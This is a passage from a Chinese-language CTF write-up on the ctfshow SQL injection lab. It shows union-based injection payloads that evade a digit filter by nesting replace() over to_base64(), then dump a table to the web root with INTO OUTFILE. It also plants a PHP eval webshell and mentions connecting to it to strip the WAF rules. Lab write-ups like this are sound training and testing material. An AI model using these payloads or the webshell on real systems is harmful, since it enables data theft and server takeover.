to_base64 → Y3Rmc2hvd3swMTg5OGY2Zi0xYWM4LTRjZGItODNjMC03NDk2ODM3MjExOTZ9
里面有数字吗？有（2、3、4、0、9、8、6、5……）→ 直接回显必被拦
```

所以再加一层 replace，把每个数字换成 `^A`~`^J`（`^` 是前缀记号，A~J 对应 0~9）：

```sql
-1' union select 'a',replace(to_base64(password),'0','^A')--+
```

```
-1' union select 'a',replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(password),'0','^A'),'1','^B'),'2','^C'),'3','^D'),'4','^E'),'5','^F'),'6','^G'),'7','^H'),'8','^I'),'9','^J') from ctfshow_user4 where username='flag'--+
```

![image-20261128193205127](/assets/ctfshow-web-sqli/image-20261128193205127.png)

十层 replace 套在 to_base64 外面：

```json
{"username":"a","password":"Y^DRmc^Chvd^DswMTg^FOGY^CZi^AxYWM^ELTRjZGItODNjMC^A^DNDk^CODM^DMjExOTZ^J"}
```

整个字符串里没有数字 → 放行。

本地逆运算两步：

1. `^A`→0、`^B`→1……`^J`→9，还原出 base64 原文：`Y3Rmc2hvd3swMTg5OGY2Zi0xYWM4LTRjZGItODNjMC03NDk2ODM3MjExOTZ9`
2. base64 解码 → 得到 flag

![image-20261128193329824](/assets/ctfshow-web-sqli/image-20261128193329824.png)

为什么要带 `^` 前缀：base64 的字母表里本来就有大写字母 A~J，如果直接把 `0` 换成 `A`，替换后的 A 分不清哪些是标记、哪些是原文。`^` 不在 base64 字母表里，标记和原文不会混（用 `_a_` 下划线也是同一个道理）。

#### 法4：into outfile，把结果写到靶机上

MySQL 账号有 FILE 权限（靶机默认放开了）时，可以让查询结果直接落盘：

```sql
1' union select username,password from ctfshow_user4 into outfile '/var/www/html/flag.txt'--+
```

查询结果写进了文件、不会进入 PHP 的检查逻辑，所以数字和 flag 原样保存。直接访问 `http://靶场地址/flag.txt` 就能看到全表。

![image-20261128192853591](/assets/ctfshow-web-sqli/image-20261128192853591.png)

还能更进一步写个 webshell：

```sql
1' union select 1,"<?php @eval($_POST[1]);?>" into outfile '/var/www/html/shell.php'--+
```

用蚁剑连上后，甚至可以打开 `api/v4-waf.php`，把里面的过滤规则删掉，变回无过滤注入。
